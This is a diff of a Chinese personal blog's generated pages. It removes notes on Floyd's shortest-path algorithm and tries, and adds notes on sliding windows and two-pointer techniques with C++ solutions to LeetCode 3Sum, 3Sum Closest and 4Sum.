-<h2 id="3-Bellman-Ford（负权图中求最短边）"><a href="#3-Bellman-Ford（负权图中求最短边）" class="headerlink" title="3. Bellman Ford（负权图中求最短边）"></a>3. Bellman Ford（负权图中求最短边）</h2><h3 id="SPFA算法（shortest-path-fastest-algorithm）"><a href="#SPFA算法（shortest-path-fastest-algorithm）" class="headerlink" title="SPFA算法（shortest path fastest algorithm）"></a>SPFA算法（shortest path fastest algorithm）</h3><h1 id="二、任意两点之间的最短路径"><a href="#二、任意两点之间的最短路径" class="headerlink" title="二、任意两点之间的最短路径"></a>二、任意两点之间的最短路径</h1><p>Flyod算法<br>$$<br>\begin{align}<br>&amp;dp[0][i][j]：初始边权重\<br>&amp;dp[k+1][i][j]：表示从i到j经过的节点&lt;&#x3D;k的最短路径长度\<br>&amp;不经过节点k：dp[k][i][j]\<br>&amp;经过节点k：dp[k][i][k]+dp[k][k][j]<br>\end{align}</p>
-<p>$$</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>,</span><br><span class="line">                                       vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n)));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">w</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n,INT_MAX/<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = e[<span class="number">0</span>], v = e[<span class="number">1</span>], wt = e[<span class="number">2</span>];</span><br><span class="line">            w[u][v]=w[v][u]=wt;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">0</span>]=w;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    dp[k + <span class="number">1</span>][i][j] =</span><br><span class="line">                        <span class="built_in">min</span>(dp[k][i][j], dp[k][i][k]+dp[k][k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minCnt = INT_MAX;</span><br><span class="line">        <span class="type">int</span> node = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != j &amp;&amp; dp[n][i][j] &lt;= distanceThreshold)</span><br><span class="line">                    cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt &lt;= minCnt) &#123;</span><br><span class="line">                minCnt = cnt;</span><br><span class="line">                node = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-<p>空间优化<br>$$<br>\begin{align}<br>&amp;dp[k+1][i][j]：表示从i到j经过的节点&lt;&#x3D;k的最短路径长度\<br>&amp;不经过节点k：dp[k][i][j]（前一步计算的结果）\<br>&amp;经过节点k：dp[k][i][k]+dp[k][k][j]\<br>&amp;dp[k+1][i][k]&#x3D;dp[k][i][k]（i到k，经过节点&lt;&#x3D;k，则中间节点肯定无k）\<br>&amp;dp[k+1][k][j]&#x3D;dp[k][k][j]<br>\end{align}</p>
-<p>$$</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = e[<span class="number">0</span>], v = e[<span class="number">1</span>], wt = e[<span class="number">2</span>];</span><br><span class="line">            dp[u][v] = dp[v][u] = wt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][k] + dp[k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minCnt = INT_MAX;</span><br><span class="line">        <span class="type">int</span> node = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != j &amp;&amp; dp[i][j] &lt;= distanceThreshold)</span><br><span class="line">                    cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt &lt;= minCnt) &#123;</span><br><span class="line">                minCnt = cnt;</span><br><span class="line">                node = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Dijkstra和floyd区别"><a href="#Dijkstra和floyd区别" class="headerlink" title="Dijkstra和floyd区别"></a>Dijkstra和floyd区别</h1><ul>
-<li>Dijkstra不能处理负权图，Flyod能处理负权图；</li>
-<li>Dijkstra处理单源最短路径，Flyod是处理多源最短路径</li>
-<li>在图确定后添加新的边，Flyod不用从头开始计算</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E7%AE%97%E6%B3%95/%E6%A0%91%EF%BC%9A%E5%AD%97%E5%85%B8%E6%A0%91%EF%BC%88%E5%89%8D%E7%BC%80%E6%A0%91%E3%80%81TrieTree%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Destiny">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="我的个人博客">
-      <meta itemprop="description" content="凡是过去，皆为序章。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 我的个人博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E7%AE%97%E6%B3%95/%E6%A0%91%EF%BC%9A%E5%AD%97%E5%85%B8%E6%A0%91%EF%BC%88%E5%89%8D%E7%BC%80%E6%A0%91%E3%80%81TrieTree%EF%BC%89/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-09-15 09:52:14" itemprop="dateModified" datetime="2023-09-15T09:52:14+08:00">2023-09-15</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="字典树（前缀树、TrieTree）"><a href="#字典树（前缀树、TrieTree）" class="headerlink" title="字典树（前缀树、TrieTree）"></a>字典树（前缀树、TrieTree）</h1><blockquote>
-<p>字典树，又称单词查找树，Trie树(&#x3D;&#x3D;Retrieval Tree&#x3D;&#x3D;)，一种树形数据结构，用于高效的存储和检索字符串数据集中的键。</p>
-<p>用于统计、排序和保存大量的字符串</p>
-<p>优点：利用字符串的公共前缀来减少查询时间，最大限度地减少无谓的字符串比较</p>
-<p>给定字符串集合构建一颗前缀树，判断前缀树中是否存在字符串或该字符串的前缀<br>字典树用于判断字符串是否存在或者是否具有某种字符串前缀</p>
+<h1 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h1><blockquote>
+<p>窗口大小固定</p>
 </blockquote>
-<p>&#x3D;&#x3D;结点表示从根结点到本结点的路径构成的字符串是否有效&#x3D;&#x3D;</p>
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master//202209202108218.png" alt="image-20220920210823099"></p>
-<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><blockquote>
-<p>字典树可以视为set，用于判断key是否存在；；但同时字典树也可以作为map，只需要再相应节点添加value值。</p>
+<p>滑动窗口，可以用来解决一些查找满足一定条件的连续区间的性质（长度等）的问题。由于区间连续，因此当区间发生变化时，可以通过旧有的计算结果对搜索空间进行剪枝，这样便减少了重复计算，降低了时间复杂度。往往类似于“请找到满足xx的最x的区间（子串、子数组）的xx”这类问题都可以使用该方法进行解决。</p>
+<p>一般滑动窗口维护两个指针，左指针和右指针。</p>
+<ul>
+<li>当窗口内的元素未达到题目条件时，右指针右移，探索未知的区间来满足条件</li>
+<li>当窗口内的元素达到题目条件时，左指针右移，压缩区间，使窗口尽可能短得满足题目条件</li>
+</ul>
+<h1 id="首尾指针"><a href="#首尾指针" class="headerlink" title="首尾指针"></a>首尾指针</h1><blockquote>
+<p>指针分别指向首位置和尾位置，向中间移动</p>
 </blockquote>
-<p><a href="https://leetcode.cn/problems/sum-of-prefix-scores-of-strings/solution/by-lfool-w82u/">详解前缀树「TrieTree 汇总级别整理 🔥🔥🔥」 - 字符串的前缀分数和 - 力扣（LeetCode）</a></p>
-<blockquote>
-<ul>
-<li>根据字符串集合构建前缀树</li>
-<li>目标字符串是否存在于前缀树中</li>
-<li>寻找目标字符串的前缀</li>
-</ul>
+<h4 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt; &amp;nums) &#123;</span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="comment">//考虑空数组情况，这里i&lt;nums.size()-2为实际范围，这样写不用判断数组大小是否符合</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        m = i + <span class="number">1</span>;</span><br><span class="line">        n = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (; m &lt; nums.<span class="built_in">size</span>(); m++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m &gt; i + <span class="number">1</span> &amp;&amp; nums[m] == nums[m - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//寻找第三个元素</span></span><br><span class="line">            <span class="keyword">while</span> (m &lt; n &amp;&amp; nums[i] + nums[m] + nums[n] &gt; <span class="number">0</span>)</span><br><span class="line">                n--;</span><br><span class="line">            <span class="comment">//比较巧妙的情况，当m==n时，说明三个数相加还是大于0的，因为已经排好序，继续向后寻找第二个数还是会大于0</span></span><br><span class="line">            <span class="keyword">if</span> (m == n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[m] + nums[n] == <span class="number">0</span>)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(vector&lt;<span class="type">int</span>&gt;&#123;nums[i], nums[m], nums[n]&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;nums[i]==nums[i<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">int</span> left=i+<span class="number">1</span>,right=n<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">                <span class="keyword">while</span>(left&lt;right&amp;&amp;left&gt;i+<span class="number">1</span>&amp;&amp;nums[left]==nums[left<span class="number">-1</span>])</span><br><span class="line">                    left++;</span><br><span class="line">                <span class="keyword">if</span>(left==right)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="type">int</span> sum=nums[i]+nums[left]+nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum&lt;<span class="number">0</span>)</span><br><span class="line">                    left++;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(sum&gt;<span class="number">0</span>)</span><br><span class="line">                    right--;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;nums[i],nums[left],nums[right]&#125;);</span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="16-最接近的三数之和"><a href="#16-最接近的三数之和" class="headerlink" title="16. 最接近的三数之和"></a><a href="https://leetcode.cn/problems/3sum-closest/">16. 最接近的三数之和</a></h4><blockquote>
+<p>使用while循环和标记跳过重复元素</p>
 </blockquote>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//两种存储方式</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TrieNode</span>&#123;</span><br><span class="line">    TrieNode* son[<span class="number">26</span>]=&#123;&#125;;</span><br><span class="line">    boolean val; <span class="comment">//路径构成的字符串是否有效</span></span><br><span class="line">&#125;;</span><br><span class="line">TrieNode *root=<span class="keyword">new</span> TrieNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建前缀树</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> c: word)&#123;</span><br><span class="line">        <span class="type">int</span> id=c-<span class="string">&#x27;a&#x27;</span>;	<span class="comment">//当前字符应该存入哪一个孩子结点</span></span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            cur-&gt;son[id]=<span class="keyword">new</span> TrieNode;</span><br><span class="line">        cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    cur-&gt;val=<span class="literal">true</span>;		<span class="comment">//表示当前字符串有效</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询给定的字符串在前缀树中是否存在</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">query</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> ch:word)&#123;</span><br><span class="line">        <span class="type">int</span> id=ch-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="comment">//字符串路径不存在</span></span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       	cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//路径存在，路径终点处的结点是否有效</span></span><br><span class="line">    <span class="keyword">return</span> cur-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//是否有word有前缀prefix</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">startsWith</span><span class="params">(string prefix)</span> </span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> ch:prefix)&#123;</span><br><span class="line">        <span class="type">int</span> id=ch-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查询完前缀</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找单词的最短前缀</span></span><br><span class="line"><span class="function">string <span class="title">shortestPrefixOf</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    string ret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> ch: word)&#123;</span><br><span class="line">        <span class="type">int</span> id=ch-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        ret+=ch;</span><br><span class="line">        cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//含有通配符的匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">search</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">query</span>(root,word,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">query</span><span class="params">(TrieNode *cur, string &amp;word,<span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="comment">//判断空节点要放在最前面，因为含有.时会遍历26个子节点</span></span><br><span class="line">    <span class="keyword">if</span>(cur==<span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(index==word.<span class="built_in">size</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(word[index]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">query</span>(cur-&gt;son[i],word,index+<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> id=word[index]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">query</span>(cur-&gt;son[id],word,index+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">threeSumClosest</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">// 跳过相同元素</span></span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;nums[i]==nums[i<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> left = i + <span class="number">1</span>, right = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">                <span class="type">int</span> tmp = nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(tmp==target) <span class="keyword">return</span> target;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(target-tmp)&lt;<span class="built_in">abs</span>(target-ans)) ans=tmp;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(tmp&lt;target)&#123;</span><br><span class="line">                    <span class="type">int</span> j=left+<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>(j&lt;right&amp;&amp;nums[j]==nums[left])</span><br><span class="line">                        j++;</span><br><span class="line">                    left=j;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="type">int</span> k=right<span class="number">-1</span>;</span><br><span class="line">                    <span class="keyword">while</span>(left&lt;k&amp;&amp;nums[k]==nums[right])</span><br><span class="line">                        k--;</span><br><span class="line">                    right=k; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//哈希表存储</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TrieNode</span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>,TrieNode*&gt; son;</span><br><span class="line">    boolean val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="18-四数之和"><a href="#18-四数之和" class="headerlink" title="18. 四数之和"></a><a href="https://leetcode.cn/problems/4sum/">18. 四数之和</a></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;nums[i]==nums[i<span class="number">-1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;i+<span class="number">1</span>&amp;&amp;nums[j]==nums[j<span class="number">-1</span>])   <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">long</span> cur=nums[i]+nums[j];</span><br><span class="line">                <span class="comment">// 双指针</span></span><br><span class="line">                <span class="type">int</span> left=j+<span class="number">1</span>,right=n<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(;left&lt;n;left++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(left&gt;j+<span class="number">1</span>&amp;&amp;nums[left]==nums[left<span class="number">-1</span>])</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">while</span>(left&lt;right&amp;&amp;cur+nums[left]+nums[right]&gt;target)</span><br><span class="line">                        right--;</span><br><span class="line">                    <span class="keyword">if</span>(left==right)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">if</span>(cur+nums[left]+nums[right]==target)&#123;</span><br><span class="line">                        ans.<span class="built_in">push_back</span>(&#123;nums[i],nums[j],nums[left],nums[right]&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-
-
-<ul>
-<li><input disabled="" type="checkbox"> <a href="https://leetcode.cn/problems/implement-trie-prefix-tree/">208. 实现 Trie (前缀树)</a></li>
-<li><input disabled="" type="checkbox"> <a href="https://leetcode.cn/problems/design-add-and-search-words-data-structure/">211. 添加与搜索单词 - 数据结构设计</a>(通配符匹配.)</li>
-<li><input disabled="" type="checkbox"> <a href="https://leetcode.cn/problems/implement-magic-dictionary/">676. 实现一个魔法字典</a>（修改一个字符的匹配，类似于存在一个.)</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
+<p>方法二</p>
